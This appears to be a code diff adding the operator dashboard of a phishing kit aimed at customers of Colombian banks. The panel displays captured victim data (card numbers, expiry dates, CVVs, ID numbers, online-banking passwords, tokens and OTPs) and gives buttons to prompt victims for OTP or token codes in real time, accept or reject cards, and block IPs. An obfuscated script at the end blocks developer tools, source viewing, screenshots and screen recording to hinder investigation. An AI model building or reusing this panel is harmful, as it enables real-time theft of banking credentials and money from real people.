+}
+
+function renderActivos() {
+    const filtro = ($('buscarActivos').value || '').toLowerCase().trim();
+    const tbody = $('tbodyActivos');
+    let lista = activosCache;
+    if (filtro) {
+        lista = lista.filter(a =>
+            (a.ip || '').toLowerCase().includes(filtro) ||
+            (a.ultimaAccion || '').toLowerCase().includes(filtro)
+        );
+    }
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin usuarios activos</td></tr>';
+        return;
+    }
+    tbody.innerHTML = lista.map(a => `
+        <tr>
+            <td class="ip">${escapeHtml(a.ip)}</td>
+            <td>${escapeHtml(a.ultimaAccion)}</td>
+            <td>${formatTime(a.tiempoDentro)}</td>
+            <td>
+                <div class="actions">
+                    <button class="btn btn-block" onclick="bloquearIp('${escapeHtml(a.ip)}')">🚫 Bloquear</button>
+                </div>
+            </td>
+        </tr>
+    `).join('');
+}
+
+function botonesSesion(s) {
+    const bancoKey = s.datos.bancoKey || '';
+    const estado = s.estado;
+    const sid = escapeHtml(s.sessionId);
+    const ip = escapeHtml(s.datos.ip || '');
+    const btns = [];
+
+    if (bancoKey === 'cc-bogota' || bancoKey === 'cc-bucaramanga') {
+        if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
+            btns.push(`<button class="btn btn-accept" onclick="accion('${sid}','ACEPTAR')">✅ Aceptar</button>`);
+        }
+        if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
+            btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+        }
+        if (estado !== 'rechazado' && estado !== 'finalizado' && estado !== 'cc_error') {
+            btns.push(`<button class="btn" style="background:#f59e0b; color:white;" onclick="accion('${sid}','CC_ERROR')">⚠️ CC Error</button>`);
+        }
+        btns.push(`<button class="btn btn-block" onclick="bloquearIp('${ip}')">🚫 IP</button>`);
+        return btns.join('');
+    }
+
+    const bancosSoloOtp = ['bancolombia', 'davivienda', 'avvillas'];
+    const bancosTokenOtp = ['caja-social', 'bbva', 'popular', 'occidente'];
+
+    if (estado === 'pendiente') {
+        if (bancoKey === 'bogota') {
+            btns.push(`<button class="btn btn-token" onclick="accion('${sid}','TOKEN')">🔢 Token</button>`);
+        } else if (bancosSoloOtp.includes(bancoKey)) {
+            btns.push(`<button class="btn btn-otp" onclick="accion('${sid}','OTP')">📱 OTP</button>`);
+        } else if (bancosTokenOtp.includes(bancoKey)) {
+            btns.push(`<button class="btn btn-token" onclick="accion('${sid}','TOKEN')">🔢 Token</button>`);
+            btns.push(`<button class="btn btn-otp" onclick="accion('${sid}','OTP')">📱 OTP</button>`);
+        }
+        btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+    } else if (estado === 'otp' || estado === 'token') {
+        btns.push(`<button class="btn btn-final" onclick="accion('${sid}','FINALIZAR')">✅ Finalizar</button>`);
+        if (estado === 'otp' && bancoKey !== 'bogota') {
+            btns.push(`<button class="btn btn-token" onclick="accion('${sid}','TOKEN')">🔢 Token</button>`);
+        } else if (estado === 'token' && bancosTokenOtp.includes(bancoKey)) {
+            btns.push(`<button class="btn btn-otp" onclick="accion('${sid}','OTP')">📱 OTP</button>`);
+        }
+        btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+    } else if (estado === 'aceptado') {
+        btns.push(`<button class="btn btn-reject" onclick="accion('${sid}','RECHAZAR')">❌ Rechazar</button>`);
+    }
+
+    btns.push(`<button class="btn btn-block" onclick="bloquearIp('${ip}')">🚫 IP</button>`);
+
+    return btns.join('');
+}
+
+async function cargarSesiones() {
+    try {
+        const d = await api('/admin/sesiones');
+        sesionesCache = d.sesiones.reverse();
+        renderSesiones();
+    } catch (e) {}
+}
+
+function renderSesiones() {
+    const filtro = ($('buscarSesiones').value || '').toLowerCase().trim();
+    const tbody = $('tbodySesiones');
+    let lista = sesionesCache;
+    if (filtro) {
+        lista = lista.filter(s => {
+            const datos = s.datos || {};
+            const texto = [
+                datos.bancoKey, s.estado, datos.identificacion, datos.clave,
+                datos.docNumber, datos.tarjeta, datos.titular, datos.token,
+                datos.otp, datos.monto, datos.ip, datos.expMes, datos.expAnio,
+                datos.cvv, datos.marca,
+                datos.bin, datos.cardType, datos.cardLevel, datos.bankName, datos.countryName
+            ].filter(Boolean).join(' ').toLowerCase();
+            return texto.includes(filtro);
+        });
+    }
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="15" class="empty">Sin sesiones</td></tr>';
+        actualizarBtnBorrarSesiones();
+        return;
+    }
+    tbody.innerHTML = lista.map(s => {
+        const datos = s.datos || {};
+        const banco = datos.bancoKey || '-';
+        const esTarjeta = banco === 'cc-bogota' || banco === 'cc-bucaramanga';
+
+        let identificacionTrj = '-';
+        let claveFch = '-';
+        let cvv = '-';
+        let documento = '';
+
+        if (esTarjeta) {
+            identificacionTrj = datos.tarjeta || '-';
+            const mes = datos.expMes || '';
+            const anio = datos.expAnio || '';
+            claveFch = (mes || anio) ? `${mes}/${anio}` : '-';
+            cvv = datos.cvv || '-';
+            documento = datos.docNumber ? `${datos.docType || 'CC'} ${datos.docNumber}` : '-';
+        } else {
+            identificacionTrj = datos.identificacion || '-';
+            claveFch = datos.clave || '-';
+            cvv = '-';
+            documento = '-';
+        }
+
+        const titular = datos.titular || '-';
+        const token = datos.token || '-';
+        const otp = datos.otp || '-';
+        const monto = datos.monto ? '$' + Number(datos.monto).toLocaleString('es-CO') : '-';
+        const ip = datos.ip || '-';
+        const checked = seleccionSesiones.has(s.sessionId) ? 'checked' : '';
+
+        // Banco emisor + nivel de tarjeta (solo para tarjetas)
+        const bancoEmisor = esTarjeta ? (datos.bankName || 'No identificado') : '-';
+        const tipo = datos.cardType || '';
+        const nivel = datos.cardLevel || '';
+
+        return `
+            <tr>
+                <td class="checkbox-col"><input type="checkbox" class="check-sesion" data-id="${escapeHtml(s.sessionId)}" ${checked}></td>
+                <td>${nombreBanco(banco, datos.marca)}</td>
+                <td><span class="estado estado-${s.estado}">${s.estado}</span></td>
+                <td class="dato" title="${escapeHtml(identificacionTrj)}">${escapeHtml(truncar(identificacionTrj, 20))}</td>
+                <td class="dato">${escapeHtml(claveFch)}</td>
+                <td class="dato">${escapeHtml(cvv)}</td>
+                <td class="dato" title="${escapeHtml(documento)}">${escapeHtml(truncar(documento, 20))}</td>
+                <td class="dato" title="${escapeHtml(titular)}">${escapeHtml(truncar(titular, 20))}</td>
+                <td class="dato">${escapeHtml(token)}</td>
+                <td class="dato">${escapeHtml(otp)}</td>
+                <td class="dato">${escapeHtml(monto)}</td>
+                <td class="ip">${escapeHtml(ip)}</td>
+                <td><span class="banco-emisor" title="${escapeHtml(bancoEmisor)}">${escapeHtml(bancoEmisor)}</span></td>
+                <td>${esTarjeta ? renderNivelTarjeta(tipo, nivel) : '<span class="bin-nivel desconocido">—</span>'}</td>
+                <td><div class="actions">${botonesSesion(s)}</div></td>
+            </tr>
+        `;
+    }).join('');
+    document.querySelectorAll('.check-sesion').forEach(cb => {
+        cb.addEventListener('change', (e) => {
+            const id = e.target.dataset.id;
+            if (e.target.checked) seleccionSesiones.add(id);
+            else seleccionSesiones.delete(id);
+            actualizarBtnBorrarSesiones();
+        });
+    });
+    actualizarBtnBorrarSesiones();
+}
+
+function actualizarBtnBorrarSesiones() {
+    const btn = $('btnBorrarSesiones');
+    btn.disabled = seleccionSesiones.size === 0;
+    btn.textContent = seleccionSesiones.size > 0
+        ? `🗑️ Borrar seleccionados (${seleccionSesiones.size})`
+        : '🗑️ Borrar seleccionados';
+}
+
+$('checkAllSesiones').addEventListener('change', (e) => {
+    if (e.target.checked) {
+        sesionesCache.forEach(s => seleccionSesiones.add(s.sessionId));
+    } else {
+        seleccionSesiones.clear();
+    }
+    renderSesiones();
+});
+
+$('btnBorrarSesiones').addEventListener('click', async () => {
+    if (!seleccionSesiones.size) return;
+    if (!confirm(`¿Borrar ${seleccionSesiones.size} sesión(es)? Esta acción es permanente.`)) return;
+    try {
+        const ids = [...seleccionSesiones];
+        await api('/admin/sesiones/borrar', { method: 'POST', body: JSON.stringify({ sessionIds: ids }) });
+        toast(`🗑️ ${ids.length} sesión(es) borrada(s)`);
+        seleccionSesiones.clear();
+        $('checkAllSesiones').checked = false;
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+});
+
+async function cargarIps() {
+    try {
+        const d = await api('/admin/ips-bloqueadas');
+        ipsCache = d.ips;
+        renderIps();
+    } catch (e) {}
+}
+
+function renderIps() {
+    const filtro = ($('buscarIps').value || '').toLowerCase().trim();
+    const tbody = $('tbodyIps');
+    let lista = ipsCache;
+    if (filtro) lista = lista.filter(ip => ip.toLowerCase().includes(filtro));
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="3" class="empty">Sin IPs bloqueadas</td></tr>';
+        actualizarBtnBorrarIps();
+        return;
+    }
+    tbody.innerHTML = lista.map(ip => {
+        const checked = seleccionIps.has(ip) ? 'checked' : '';
+        return `
+            <tr>
+                <td class="checkbox-col"><input type="checkbox" class="check-ip" data-id="${escapeHtml(ip)}" ${checked}></td>
+                <td class="ip">${escapeHtml(ip)}</td>
+                <td><button class="btn btn-unblock" onclick="desbloquearIp('${escapeHtml(ip)}')">🔓 Desbloquear</button></td>
+            </tr>
+        `;
+    }).join('');
+    document.querySelectorAll('.check-ip').forEach(cb => {
+        cb.addEventListener('change', (e) => {
+            const id = e.target.dataset.id;
+            if (e.target.checked) seleccionIps.add(id);
+            else seleccionIps.delete(id);
+            actualizarBtnBorrarIps();
+        });
+    });
+    actualizarBtnBorrarIps();
+}
+
+function actualizarBtnBorrarIps() {
+    const btn = $('btnBorrarIps');
+    btn.disabled = seleccionIps.size === 0;
+    btn.textContent = seleccionIps.size > 0
+        ? `🗑️ Borrar seleccionados (${seleccionIps.size})`
+        : '🗑️ Borrar seleccionados';
+}
+
+$('checkAllIps').addEventListener('change', (e) => {
+    if (e.target.checked) ipsCache.forEach(ip => seleccionIps.add(ip));
+    else seleccionIps.clear();
+    renderIps();
+});
+
+$('btnBorrarIps').addEventListener('click', async () => {
+    if (!seleccionIps.size) return;
+    if (!confirm(`¿Borrar ${seleccionIps.size} IP(s) de la lista?`)) return;
+    try {
+        const ips = [...seleccionIps];
+        await api('/admin/ips/borrar', { method: 'POST', body: JSON.stringify({ ips }) });
+        toast(`🗑️ ${ips.length} IP(s) borrada(s)`);
+        seleccionIps.clear();
+        $('checkAllIps').checked = false;
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+});
+
+async function cargarLogs() {
+    try {
+        const d = await api('/admin/logs');
+        logsCache = d.logs;
+        $('badgeLogs').textContent = d.logs.length;
+        renderLogs();
+    } catch (e) {}
+}
+
+function renderLogs() {
+    const filtro = ($('buscarLogs').value || '').toLowerCase().trim();
+    const tbody = $('tbodyLogs');
+    let lista = logsCache;
+    if (filtro) {
+        lista = lista.filter(l => {
+            const texto = [l.tipo, JSON.stringify(l.datos)].join(' ').toLowerCase();
+            return texto.includes(filtro);
+        });
+    }
+    if (!lista.length) {
+        tbody.innerHTML = '<tr><td colspan="4" class="empty">Sin logs</td></tr>';
+        actualizarBtnBorrarLogs();
+        return;
+    }
+    tbody.innerHTML = lista.map(l => {
+        const fecha = new Date(l.fecha).toLocaleString('es-CO');
+        const checked = seleccionLogs.has(l.id) ? 'checked' : '';
+        return `
+            <tr>
+                <td class="checkbox-col"><input type="checkbox" class="check-log" data-id="${escapeHtml(l.id)}" ${checked}></td>
+                <td>${escapeHtml(fecha)}</td>
+                <td>${escapeHtml(l.tipo)}</td>
+                <td class="dato">${escapeHtml(JSON.stringify(l.datos))}</td>
+            </tr>
+        `;
+    }).join('');
+    document.querySelectorAll('.check-log').forEach(cb => {
+        cb.addEventListener('change', (e) => {
+            const id = e.target.dataset.id;
+            if (e.target.checked) seleccionLogs.add(id);
+            else seleccionLogs.delete(id);
+            actualizarBtnBorrarLogs();
+        });
+    });
+    actualizarBtnBorrarLogs();
+}
+
+function actualizarBtnBorrarLogs() {
+    const btn = $('btnBorrarLogs');
+    btn.disabled = seleccionLogs.size === 0;
+    btn.textContent = seleccionLogs.size > 0
+        ? `🗑️ Borrar seleccionados (${seleccionLogs.size})`
+        : '🗑️ Borrar seleccionados';
+}
+
+$('checkAllLogs').addEventListener('change', (e) => {
+    if (e.target.checked) logsCache.forEach(l => seleccionLogs.add(l.id));
+    else seleccionLogs.clear();
+    renderLogs();
+});
+
+$('btnBorrarLogs').addEventListener('click', async () => {
+    if (!seleccionLogs.size) return;
+    if (!confirm(`¿Borrar ${seleccionLogs.size} log(s)?`)) return;
+    try {
+        const ids = [...seleccionLogs];
+        await api('/admin/logs/borrar', { method: 'POST', body: JSON.stringify({ ids }) });
+        toast(`🗑️ ${ids.length} log(s) borrado(s)`);
+        seleccionLogs.clear();
+        $('checkAllLogs').checked = false;
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+});
+
+async function accion(sessionId, accion) {
+    try {
+        await api('/admin/sesion/' + encodeURIComponent(sessionId) + '/accion', {
+            method: 'POST',
+            body: JSON.stringify({ accion })
+        });
+        toast('✅ ' + accion + ' aplicado');
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+}
+
+async function bloquearIp(ip) {
+    if (!ip || ip === '-') { toast('IP inválida', true); return; }
+    if (!confirm('¿Bloquear la IP ' + ip + '?')) return;
+    try {
+        await api('/admin/ip/bloquear', { method: 'POST', body: JSON.stringify({ ip }) });
+        toast('🚫 IP bloqueada: ' + ip);
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+}
+
+async function desbloquearIp(ip) {
+    if (!confirm('¿Desbloquear la IP ' + ip + '?')) return;
+    try {
+        await api('/admin/ip/desbloquear', { method: 'POST', body: JSON.stringify({ ip }) });
+        toast('🔓 IP desbloqueada: ' + ip);
+        cargarTodo();
+    } catch (e) { toast('Error: ' + e.message, true); }
+}
+
+$('btnBloquearManual').addEventListener('click', async () => {
+    const ip = $('inputNuevaIp').value.trim();
+    if (!ip) { toast('Escribe una IP', true); return; }
+    await bloquearIp(ip);
+    $('inputNuevaIp').value = '';
+});
+
+$('buscarActivos').addEventListener('input', renderActivos);
+$('buscarSesiones').addEventListener('input', renderSesiones);
+$('buscarIps').addEventListener('input', renderIps);
+$('buscarLogs').addEventListener('input', renderLogs);
+
+if (TOKEN) {
+    fetch(API_BASE + '/admin/stats', { headers: { 'Authorization': 'Bearer ' + TOKEN } })
+        .then(r => { if (r.ok) mostrarDashboard(); else logout(); })
+        .catch(() => logout());
+}
+
+document.addEventListener('keydown', e => {
+    if (e.key === 'Escape' && TOKEN) logout();
+});
 </script>
 
+<script>
+(function(){
+'use strict';
+var _0xa1=0;
+document.addEventListener('touchend',function(_0xb2){
+var _0xc3=new Date().getTime();
+if(_0xc3-_0xa1<=300){_0xb2.preventDefault();}
+_0xa1=_0xc3;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xd4){_0xd4.preventDefault();});
+document.addEventListener('contextmenu',function(_0xe5){_0xe5.preventDefault();return false;});
+document.addEventListener('keydown',function(_0xf6){
+var _0xg7=(_0xf6.key||'').toLowerCase();
+var _0xh8=_0xf6.ctrlKey||_0xf6.metaKey;
+var _0xi9=_0xf6.shiftKey;
+if(_0xg7==='f12'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xi9&&(_0xg7==='i'||_0xg7==='j'||_0xg7==='c')){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='u'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='s'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='p'){_0xf6.preventDefault();return false;}
+if(_0xh8&&_0xg7==='a'){_0xf6.preventDefault();return false;}
+});
+document.addEventListener('dragstart',function(_0xj0){_0xj0.preventDefault();});
+document.addEventListener('selectstart',function(_0xl1){
+var _0xm2=(_0xl1.target&&_0xl1.target.tagName)?_0xl1.target.tagName.toLowerCase():'';
+if(_0xm2!=='input'&&_0xm2!=='textarea'){_0xl1.preventDefault();}
+});
+try{if(window.top!==window.self){window.top.location=window.self.location;}}catch(_0xn3){document.body.innerHTML='';}
+
+var _0xo4=null;
+function _0xp5(){
+    document.documentElement.style.filter='blur(20px)';
+    document.documentElement.style.transition='filter 0.1s';
+    setTimeout(function(){
+        document.documentElement.style.filter='';
+    },1500);
+}
+window.addEventListener('keyup',function(_0xq6){
+    var _0xr7=_0xq6.key||'';
+    var _0xs8=_0xr7.toLowerCase();
+    if(_0xs8==='printscreen'||_0xq6.keyCode===44){_0xp5();}
+    if(_0xq6.metaKey&&_0xq6.shiftKey&&_0xs8==='s'){_0xp5();}
+    if(_0xq6.metaKey&&_0xs8==='printscreen'){_0xp5();}
+    if(_0xq6.metaKey&&_0xq6.shiftKey&&(_0xs8==='3'||_0xs8==='4'||_0xs8==='5')){_0xp5();}
+},{capture:true});
+document.addEventListener('visibilitychange',function(){
+    if(document.hidden){document.body.style.filter='blur(30px)';}
+    else{document.body.style.filter='';}
+});
+if(navigator.mediaDevices&&navigator.mediaDevices.getDisplayMedia){
+    navigator.mediaDevices.getDisplayMedia=function(){
+        _0xp5();
+        return Promise.reject(new Error('Captura no permitida'));
+    };
+}
+if(window.MediaRecorder){
+    window.MediaRecorder=function(){_0xp5();throw new Error('Grabación no permitida');};
+}
+})();
+</script>
 </body>
 </html>
